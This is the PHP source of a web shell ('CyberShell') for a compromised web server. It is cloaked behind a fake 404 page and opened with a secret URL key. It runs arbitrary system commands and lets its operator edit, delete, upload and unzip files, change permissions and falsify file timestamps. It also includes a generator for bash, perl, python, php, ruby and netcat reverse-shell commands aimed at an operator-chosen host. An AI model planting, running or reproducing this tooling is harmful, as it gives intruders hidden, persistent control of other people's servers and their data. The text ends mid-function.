<?php
define('ACCESS_KEY', 'monero1'); 
define('ACCESS_PARAM', 'elect'); 

error_reporting(0);
ini_set('display_errors', 0);
session_start();

function checkAccess() {
    if (!isset($_SESSION['shell_authorized'])) {
        if (isset($_GET[ACCESS_PARAM]) && $_GET[ACCESS_PARAM] === ACCESS_KEY) {
            $_SESSION['shell_authorized'] = true;
            return true;
        }
        header("HTTP/1.0 404 Not Found");
        echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
        exit;
    }
    return true;
}

if (!checkAccess()) {
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>CyberShell</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="D7net">
    <meta name="description" content="Error Page">
    <meta property="og:description" content="Error Page">
    <meta property="og:image" content="#">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">

    <style>
:root {
    --matrix-green: #00ff41;
    --matrix-dark: #0a0a0a;
    --matrix-glow: #003B00;
    --terminal-black: #0a0a0a;
    --scanline-color: rgba(0, 255, 65, 0.1);
}

@keyframes scanline {
    0% { transform: translateY(-100%); }
    100% { transform: translateY(100%); }
}

@keyframes flicker {
    0% { opacity: 0.97; }
    5% { opacity: 0.93; }
    10% { opacity: 0.97; }
    15% { opacity: 0.94; }
    20% { opacity: 0.95; }
    100% { opacity: 0.95; }
}

body {
    font-family: 'Share Tech Mono', monospace;
    background-color: var(--matrix-dark);
    color: var(--matrix-green);
    margin: 0;
    padding: 0;
    min-height: 100vh;
    position: relative;
    overflow-x: hidden;
}

/* Terminal scanline effect */
body::before {
    content: "";
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(
        transparent 50%,
        rgba(0, 255, 65, 0.02) 50%
    );
    background-size: 100% 4px;
    pointer-events: none;
    z-index: 1;
}

.header {
    background: rgba(10, 10, 10, 0.95);
    border-bottom: 2px solid var(--matrix-green);
    backdrop-filter: blur(10px);
    position: sticky;
    top: 0;
    z-index: 1000;
    padding: 1rem;
    box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
    width: 100%;
    margin: 0 auto;
    text-align: center;
}

.directory-listing-table {
    background: rgba(10, 10, 10, 0.9);
    border: 1px solid var(--matrix-green);
    border-radius: 4px;
    margin: 20px auto;
    padding: 20px;
    position: relative;
    overflow: hidden;
    width: 90%;
    box-shadow: 0 0 15px rgba(0, 255, 65, 0.1);
}

.table {
    width: 100% !important;
    margin: 0 !important;
    border-collapse: separate !important;
    border-spacing: 0 4px !important;
    background: transparent !important;
}

.table td {
    background: rgba(0, 20, 0, 0.4);
    border-bottom: 1px solid rgba(0, 255, 65, 0.1) !important;
    padding: 12px !important;
}

.table thead th {
    background: rgba(0, 40, 0, 0.6) !important;
    border-bottom: 2px solid var(--matrix-green) !important;
    color: var(--matrix-green) !important;
    font-family: 'Share Tech Mono', monospace !important;
    text-transform: uppercase;
    letter-spacing: 2px;
    padding: 15px !important;
    font-weight: 500;
    text-align: center !important;
}

.btn {
    background: rgba(0, 20, 0, 0.6);
    border: 1px solid var(--matrix-green);
    color: var(--matrix-green);
    font-family: 'Share Tech Mono', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
    padding: 8px 16px;
    transition: all 0.3s ease;
    text-shadow: 0 0 5px var(--matrix-green);
    position: relative;
    overflow: hidden;
}

.btn:hover {
    background: rgba(0, 255, 65, 0.1);
    box-shadow: 0 0 10px var(--matrix-green);
}

.btn::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(
        90deg,
        transparent,
        rgba(0, 255, 65, 0.2),
        transparent
    );
    transition: 0.5s;
}

.btn:hover::before {
    left: 100%;
}

input, textarea, select {
    background: rgba(10, 10, 10, 0.8);
    border: 1px solid var(--matrix-green);
    color: var(--matrix-green);
    font-family: 'Share Tech Mono', monospace;
    padding: 8px 12px;
    border-radius: 4px;
    transition: all 0.3s ease;
}

input:focus, textarea:focus, select:focus {
    outline: none;
    box-shadow: 0 0 10px var(--matrix-green);
    background: rgba(0, 40, 0, 0.4);
}

/* Scrollbar styling */
::-webkit-scrollbar {
    width: 8px;
    height: 8px;
}

::-webkit-scrollbar-track {
    background: rgba(0, 20, 0, 0.8);
}

::-webkit-scrollbar-thumb {
    background: var(--matrix-green);
    border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
    background: rgba(0, 255, 65, 0.8);
}

/* Professional cursor */
body, a, button {
    cursor: default;
}

a, button, input[type="submit"] {
    cursor: pointer;
}

.table-hover tbody tr:hover {
    background: rgba(0, 255, 65, 0.05) !important;
    transition: all 0.3s ease;
}

a {
    color: var(--matrix-green);
    text-decoration: none;
    transition: all 0.3s ease;
}

a:hover {
    color: #fff;
    text-shadow: 0 0 8px var(--matrix-green);
}

.badge-action {
    background: transparent;
    border: 1px solid var(--matrix-green);
    color: var(--matrix-green);
    padding: 4px 8px;
    border-radius: 4px;
    transition: all 0.3s ease;
}

.badge-action:hover {
    background: rgba(0, 255, 65, 0.1);
    box-shadow: 0 0 10px var(--matrix-green);
}

@media (max-width: 768px) {
    .directory-listing-table {
        padding: 10px;
        font-size: 14px;
        width: 95%;
    }

    .btn {
        padding: 6px 12px;
        font-size: 14px;
    }
}
</style>
</head>
</td>
<script>
function myFunction() {
  var copyText = document.getElementById("myInput");
  copyText.select();
  copyText.setSelectionRange(0, 99999); 
  navigator.clipboard.writeText(copyText.value);
  alert("Copied Successfully!!");
}
</script>
<?php
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@http_response_code(404);
$web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'];
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
    $disf = "<font color='lime'>AMAN</font>";
} else {
    $disf = "<font color='red'>".$disfunc."</font>";
}
function author() {
    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2017 &copy; Azeri | Azeri team</center></td></table><br>";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $serlok = $_GET['path'];
    } else {
        $serlok = getcwd();
    }
    if (is_writable($serlok)) {
        return "<font color='lime'>Aman Coy</font>";
    } else {
        return "<font color='red'>KONTOL!</font>";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return "<font color='lime'>Aman Coy</font>";
    } else {
        return "<font color='red'>KONTOL!</font>";
    }
}
function d7net_ex($file) {
    $pile = $file;
    $pch = pathinfo($pile, PATHINFO_FILENAME);
    return $pch;
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}
function net($hexnet) {
            for ($i = 0; $i < strlen($hexnet); $i++) {
                $d7net .= dechex(ord($hexnet[$i]));
            }
            return $d7net;
        }
function owner($file) {
    if (function_exists("posix_getpwuid")) {
        $tod = @posix_getpwuid(fileowner($file));
        return "<center>".$tod['name']."</center>";
    } else {
        return "<center>".fileowner($file)."</center>";
    }
}

function cekwrite($serlok) {
    $izin = substr(sprintf('%o', fileperms($serlok)), -4);
    if (is_writable($serlok)) {
        return "<font color=lime>".$izin."</font>";
    } else {
        return "<font color=red>".$izin."</font>";
    }
}
function cmd($gas, $serlok) {
    $crot = $gas;
    $pr = "proc_open";
    if (function_exists($pr)) {
    $tod = @proc_open($crot, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
    echo "".stream_get_contents($crottz[1])."</textarea></center><br>";
    } else {
        echo "<font color='orange'></font>";
    }
}
function ekse($coman, $serlok) {
    if(strpos(strtolower($coman), 'cd ') === 0) {
        $newDir = substr($coman, 3);
        if($newDir == '..') {
            $serlok = dirname($serlok);
        } else if($newDir == '/') {
            $serlok = '/';
        } else {
            $targetDir = realpath($serlok . '/' . $newDir);
            if($targetDir && is_dir($targetDir)) {
                $serlok = $targetDir;
                echo "Changed directory to: $targetDir\n";
            } else {
                echo "Directory changed: $newDir\n";
            }
        }
        $_SESSION['current_dir'] = $serlok;
        return;
    }

    $ler = "2>&1";
    if (!preg_match("/".$ler."/i", $coman)) {
        $coman = $coman." ".$ler;
    }
    $komen = $coman;
    $pr = "proc_open";
    if (function_exists($pr)) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($komen, $descriptorspec, $pipes, $serlok);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
            echo "<pre><textarea rows='25' style='color:lime;' readonly='' cols='120px'>"
                 . htmlspecialchars($output)
                 . "</textarea></pre><br>";
        }
    } else {
        echo "<font color='orange'>proc_open function is disabled!!</font>";
    }
}
function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function cekfile($file) {
     return '<i class="fa fa-file-code-o" style="font-size:17px;color:#456DEB;"></i>';
}
function filedate($file) {
    return date("F d Y g:i:s", filemtime($file));
}
function fext($file) {
    $sub = "\163\x75" . "\142\x73" . "\x74\x72";
    return $sub(strrchr($file,'.'),1);
} function gazz($file) {
    $fbiasa = array("php","phtml","shtml","phar","php7","html","htm","inc","phps","txt","js","css","htaccess","bin","pl","py","sh","php58","PhP7","aspx","dll","ini");
    $notf = array("jpeg","jpg","png","gif","ico","webp","mp3","m4A","flac","wav","wma","3gp","ogg","webm","mp4","exe");
    $stl = "\x73\x74" . "\162\164" . "\157\154\x6f" . "\167\x65\162";
    $ext=$stl(fext($file));
    if ($file == 'error_log') {
        return "
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color: #36F239'></i></button>
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear' style='color: #06D2D5'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar' style='color: #4542F9'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash' style='color: #E53A3A'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-unzip' name='pilih' value='unzip'>
<i class='fa fa-file-archive-o' style='color: #F1BE0F'></i></button>";
    } elseif(in_array($ext,$fbiasa)) {
        return "
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color: var(--success-green)'></i></button>

<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil' style='color: var(--cyber-white)'></i></button>

<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear' style='color: var(--warning-orange)'></i></button>

<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar' style='color: var(--primary-blue)'></i></button>

<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash' style='color: var(--accent-red)'></i></button>

<button type='submit' class='btn btn-outline-warning badge-action-unzip' name='pilih' value='unzip'>
<i class='fa fa-file-archive-o' style='color: var(--warning-orange)'></i></button>
<i class='fa fa-trash'></i></button>";
    } elseif(in_array($ext,$notf)) {
        return "
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>";
    }  elseif($ext == 'zip') {
        return "
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>
<button type='submit' class='btn btn-outline-warning badge-action-unzip' name='pilih' value='unzip'>
<i class='fa fa-file-archive-o'></i></button>";
    } else {
        return "
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color:#7AFF41'></i></button>
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>";
    }
}

function unzip($file, $serlok) {
    if (!is_readable($file)) {
        red("<table class='directory-listing-table' style='color:orange;'><thead><td><font color='orange'>Cannot Unzip File / Unreadable File !</font></td></thead></table>");
        die();
    } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> This isn't Zip File</center></font></td></table>";
        die();
    }
    $zip = new ZipArchive;
    $res = $zip -> open($file);
    if ($res == true) {
        $zip -> extractTo($serlok);
        $zip -> close();
        echo "<table class='directory-listing-table' style='border-color:lime;'> <td>Unzip File Successfully => <font color='lime'>".basename($_POST['path'])."</font><br>
        Extract to : <font color='aqua'>".$file."</font></td></thead</table>";
    } else {
        echo "<table class='directory-listing-table' style='border-color:red;'><td><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Unzip File!!</font></td></table>";
    }
    exit();
}
foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
    $serlok = $_GET['path'];
    $serlok2 = $_GET['path'];
} else {
    $serlok = getcwd();
    $serlok2 = getcwd();
}

$serlok = str_replace('\\','/',$serlok);
$serloks = explode('/',$serlok);
$serlokbos = @scandir($serlok);


echo '<table class="header"><td><center>
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> Azeri</a></center></div></td><td>';
echo '<table align="center"><td>
<div class="btn-group me-2" role="group" aria-label="First group">
<button type="button" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i> Home</font></button>
<div class="btn-group me-2" role="group" aria-label="First group">
<button type="button" onclick=location.href="?path='.$serlok.'&'.net("cmd").'=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i> Console</button>';

echo '<button type="button" onclick=location.href="?path='.$serlok.'&'.net("upload").'=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i> Upload</button>

<button type="button" class="btn btn-outline-light"onclick=location.href="?path='.$serlok.'&'.net("info").'=opet"><i class="fa fa-info-circle"></i> information</button>

<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfile").'=opet"><i class="fa-solid fa-file-circle-plus" style="color:#1F5ACF;"></i> Create File</button>

<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfolder").'=opet" style="float: right;"><i class="fa-solid fa-folder-plus" style="color:#FAA625;"></i> Create Folder</button>

<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("about").'=opet" style="float: right;"><i class="fa fa-info"></i> About</button>

<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("tool").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i> Tools</button>
</td></tr></div>
</div></div></td></table></table><br>';
echo '<table class="directory-listing-table"><td><i class="fa fa-folder" style="color:#F19013;"></i> <b>:</b> ';
foreach($serloks as $id => $lok){
    if($lok == '' && $id == 0){
        echo '<a href="?path=/">/&nbsp;</a></center>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0; $i<=$id; $i++){
    echo $serloks[$i];
    if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>&nbsp;/&nbsp;';
}
echo '</td></thead></table><br>';
    if (isset($_REQUEST['logout'])) {
        session_start();
        session_destroy();
        echo '<script>window.location="'.$_SERVER['SCRIPT_NAME'].'";</script>';
    }

if (isset($_GET['viewfile'])) {
    $files = basename($_GET['viewfile']);
    echo "<table class='directory-listing-table'><td><center>Filename : <font color='orange'>$files</font>";
    echo '<form method="POST" action="?pilihan&path='.$serlok.'">';
    echo "<table width='20%' border='0' cellpadding='0' cellspacing='0' align='center'><td>
    <a href='?path=$serlok' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> back</a>";
    echo gazz($file);
    echo "<button type='button' style='float:right;' class='btn btn-outline-light' onclick='myFunction()'><i class='fa fa-copy'></i> Copy</button></div><br><br>";
    echo "<input type='hidden' name='type' value='file'>
    <input type='hidden' name='name' value='$files'>
    <input type='hidden' name='path' value='$serlok/$files'>";
    echo "<textarea readonly='' cols=120 rows=30 id='myInput'>".htmlspecialchars(file_get_contents($_GET['viewfile']))."</textarea></td></table></table><br>";
    exit();
} elseif ($_REQUEST[net('revgen')] == "opet") {
    echo '<table class="directory-listing-table"><td>
    <h5><i class="fa fa-terminal"></i> Connection Generator</h5><hr>
    <form method="POST">
    <div class="gen-container">
        <div class="input-group mb-3">
    <span class="input-group-text" style="background-color: #333; color: aqua;">IP:</span>
    <input type="text" name="ip" class="form-control" placeholder="127.0.0.1" style="background-color: rgb(0, 191, 255); color: aqua;">
    <span class="input-group-text" style="background-color: #333; color: aqua;">Port:</span>
    <input type="text" name="port" class="form-control" placeholder="4444" style="background-color:rgb(0, 191, 255); color: aqua;">
</div>
        
        <div class="input-group mb-3">
            <span style="background-color: #333; color: aqua;" class="input-group-text">Type:</span>
            <select style="background-color: #333; color: aqua;" name="type" class="form-control">
                <option value="bash">Bash</option>
                <option value="perl">Perl</option>
                <option value="python">Python</option>
                <option value="php">PHP</option>
                <option value="ruby">Ruby</option>
                <option value="netcat">Netcat</option>
            </select>
        </div>

        <button type="submit" name="generate" style="background-color: #333; color: aqua;" class="btn btn-outline-light">Generate</button>
    </div>
    </form>';

    if(isset($_POST['generate'])) {
        $ip = $_POST['ip'];
        $port = $_POST['port'];
        $type = $_POST['type'];
        
        echo '<div class="output-container mt-4">';
        echo '<div class="output-header">Generated Command:</div>';
        echo '<div class="output-content">';
        
        switch($type) {
            case 'bash':
                echo 'bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1';
                break;
            case 'perl':
                echo 'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'';
                break;
            case 'python':
                echo 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$ip.'",'.$port.'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';
                break;
            case 'php':
                echo 'php -r \'$sock=fsockopen("'.$ip.'",'.$port.');exec("/bin/sh -i <&3 >&3 2>&3");\'';
                break;
            case 'ruby':
                echo 'ruby -rsocket -e\'f=TCPSocket.open("'.$ip.'",'.$port.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'';
                break;
            case 'netcat':
                echo 'nc -e /bin/sh '.$ip.' '.$port;
                break;
        }
        
        echo '</div></div>';
    }

    echo "<style>
    .gen-container {
        background: rgba(0,10,0,0.4);
        padding: 20px;
        border-radius: 8px;
        border: 1px solid var(--matrix-green);
    }
    
    .output-container {
        background: rgba(0,0,0,0.6);
        border: 1px solid var(--matrix-green);
        border-radius: 4px;
    }
    
    .output-header {
        padding: 10px;
        background: rgba(0,20,0,0.4);
        border-bottom: 1px solid var(--matrix-green);
        color: var(--matrix-green);
    }
    
    .output-content {
        padding: 15px;
        color: var(--matrix-green);
        font-family: 'Share Tech Mono', monospace;
        word-break: break-all;
    }
    </style>";
    
    echo '</td></table><br>';
    exit();

} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            echo '<table class="directory-listing-table" style="border-color:red;"><td><center><font color="red"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Failed to delete Directory</font></center></td></table>';
        } else {
            echo '<table class="directory-listing-table" style="border-color:lime;"><td><center><font color="lime"><i class="fa fa-trash"></i> Folder removed</font></center></td></table>';
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            echo "<table class='directory-listing-table' style='border-color:red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Delete File</font></center></td></table>";
        } else {
            echo "<table class='directory-listing-table' style='border-color:lime;'><td><center><i class='fa fa-trash'></i> File removed <font color='lime'>".basename($_POST['path'])."</font></center></td></table>";
        }
    }
    exit();    
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $namabaru = $_GET['path']."/".$_POST['newname'];
        if (@rename($_POST['path'], $namabaru) === true) {
            echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Change Name Success<center></td></table><br>";
            if ($_POST['type'] == "file") {
                echo "<table class='directory-listing-table'><td><center>Filename : <font color='orange'>".basename($_POST['newname'])."</font><br><br>";
            } else {
                echo "<table class='directory-listing-table'><td><center><center>Folder : <font color='orange'>".basename($_POST['newname'])."</font><br>";
            }
            echo '<form method="post">
            <div class="input-group mb-1" style="width:300px;">
            <input name="newname" type="text" class="form-control" size="20" placeholder="New name" />
            <input type="hidden" name="path" value="'.$_POST['newname'].'">
            <input type="hidden" name="pilih" value="gantinama">';
            if ($_POST['type'] == "file") {
                echo '<input type="hidden" name="type" value="file">';
            } else {
                echo '<input type="hidden" name="type" value="dir">';
            }
            echo '<input type="submit" value="Change" name="gantin" class="btn btn-outline-light mb-1">
            </div></form></td></table>';
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> FAILED TO CHANGE NAME</font></center></td></table>";
        }
    } else {
        if ($_POST['type'] == "file") {
            echo "<table class='directory-listing-table'><td><center>Filename <font color='orange'>: ".basename($_POST['path'], $_GET['file'])."</font><br><br>";
        } else {
            echo "<table class='directory-listing-table'><td><center>Folder <font color='orange'>: ".basename($_POST['path'])."</font><br><br>";
        }
        echo '
        <form method="post">
        <div class="input-group mb-1" style="width:300px;">
        <input name="newname" type="text" class="form-control" size="20" placeholder="New name" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="pilih" value="gantinama">';
        if ($_POST['type'] == "file") {
            echo '<input type="hidden" name="type" value="file">';
        } else {
            echo '<input type="hidden" name="type" value="dir">';
        }
        echo '<input type="submit" value="Change" name="gantin" class="btn btn-outline-light mb-1"/>
        </div></form></td></table><br>';
    } exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>File saved Successfully</font></center></td></table><br>";
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Can't save file/Permission Denied</font></center></td></table><br>";
        }
    }
    echo "<center><table class='directory-listing-table'><td><center> Filename : <font color='orange'>".basename($_POST['path'])."</font><br><br>";
    echo '<form method="post">
    <div class="btn-group me-2" role="group" aria-label="First group">
    <a href="?path='.$serlok.'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> back</a>
    <button type="submit" name="gasedit" class="btn btn-outline-light"style="width:250px;">
    <i class="fa fa-save"></i> Save</button>
    <button type="button" class="btn btn-outline-light" onclick="myFunction()"><i class="fa fa-copy"></i> Copy</button></div><br><br>
    <textarea type="text" cols=120 id="myInput" rows=30 name="src">'.htmlspecialchars(@file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
    <input type="hidden" name="pilih" value="edit">
    </form><br></td></thead></table><br>'; exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "chdatef") {
    $filedate = basename($_POST['path']);
      $tgl = date("F d Y g:i:s", filemtime($_POST['path']));
          echo "<table class='directory-listing-table'><td>
          <form method='post'><center>
          <font color='#fff'>Ubah Tanggal<br>Folder :</font> <font color='orange'>$filedate</font> 
          <br>$tgl<br><br><div class='input-group mb-3' style='width:280px;'>         
          <input name='tanggal' type='text' class='form-control' value='".$_POST['tanggal']."' placeholder='$tgl'/>
          <input type='hidden' name='path' value='".$_POST['path']."'>
          <input type='hidden' name='pilih' value='chdatef'>
          <button type='submit' class='btn btn-outline-light mb-1' name='change' value='change'>Change</button></div></form></center></td></table>";
          if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($_POST['path'], $tanggal) == true) {
          echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><center>Changed Successfully!!</font></center></td></table>";
        } else {
          echo "<br><table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change date!!</td></table>";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "chdate") {
    $filedate = basename($_POST['path']);
      $tgl = date("F d Y g:i:s", filemtime($_POST['path']));
          echo "<table class='directory-listing-table'><td>
          <form method='post'><center><font color='#fff'>Ubah Tanggal<br>File :</font> <font color='orange'>$filedate <br></font>$tgl
          <br><br><div class='input-group mb-3' style='width:300px;'>
          <input name='tanggal' type='text' class='form-control' value='".$_POST['tanggal']."' placeholder='$tgl'/>
          <input type='hidden' name='path' value='".$_POST['path']."'>
          <input type='hidden' name='pilih' value='chdate'>
          <button type='submit' class='btn btn-outline-light mb-1' name='change' value='change'>Change</button>
          </div></form></center></td></table>";
          if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($_POST['path'], $tanggal) == true) {
          echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><center>Changed Successfully!!</font></center></td></table>";
        } else {
          echo "<br><table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change date!!</td></table>";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "chmodf") {
    $files = basename($_POST['path']);
    $sbr = 'substr'; $spr = 'sprintf'; $flperm = 'fileperms';
      echo "<table class='directory-listing-table'><td>
      <br><center> <font color='#fff'>Folder : <font color='orange'>$files</font> (".$sbr($spr('%o',$flperm($_POST['path'])), -4).")<br><br>
      <form method='post'>
      <div class='input-group mb-3' style='width:230px;'>
    <input type='text' name='mod1' maxlength='4' class='form-control' height='10' value='".$_POST['mod1']."' placeholder='0755' required/> 
    <input type='hidden' name='path' value='".$_POST['path']."'>
    <input type='hidden' name='pilih' value='chmodf'>
    <button type='submit' class='btn btn-outline-light mb-1' name='ganti' value='ganti'>Change</button>
    </div></form></td></table>";
    if (isset($_POST['ganti'])) {
      $opet = @chmod($_POST['path'], octdec($_POST['mod1']));
    if ($opet == true) {
        echo "<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>";
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change!!</font></center></td></table>";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "chmod") {
    $files = basename($_POST['path']);
    $sbr = 'substr'; $spr = 'sprintf'; $flperm = 'fileperms';
      echo "<table class='directory-listing-table'><td>
